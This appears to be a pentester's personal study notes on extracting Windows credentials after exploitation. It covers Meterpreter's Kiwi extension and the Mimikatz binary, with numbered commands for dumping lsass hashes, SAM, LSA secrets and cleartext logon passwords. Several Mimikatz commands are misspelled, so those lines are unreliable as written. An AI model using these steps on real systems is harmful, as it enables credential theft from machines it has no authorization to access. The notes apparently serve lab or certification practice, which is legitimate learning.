
MimiKatz
=
Requires elevated privilege's 

located in /usr/share/windows-resources if you cant get meterpreter

Standard for post exploitation password/hash extraction and kerberos tickets from memory

can extract the hashes from lsass.exe process from memory

we can use mimkatz binary in kali or with meterpreter we can use Kiwi

Kiwi
=
MimiKatz meterpreter tool

Methodology
=
requires elevated privileges
Kiwi:
1. get meterpreter shell
2. `sysinfo` - get system information
3. `pgrep lsass`
4. migrate to pid of lsass
5. `load kiwi`
6. `?` - for help
7. `creds_all` - dumps hashes
8. `lsa_dump_sam` - dumps sam along with syskey and samkey
9. `lsa_dump_secrets` - may dump clear text credentials

Mimikatz:
1. upload mimikatz to target with meterpreter
2. `.\mimikatz.exe`
3. `priviledge::debug` - look for 20 ok for correct privs
4. `lsadump::sam`
5. `lasdump::secrets`
6. `sekurllsa::logonpasswords` - look for clear text logon passwords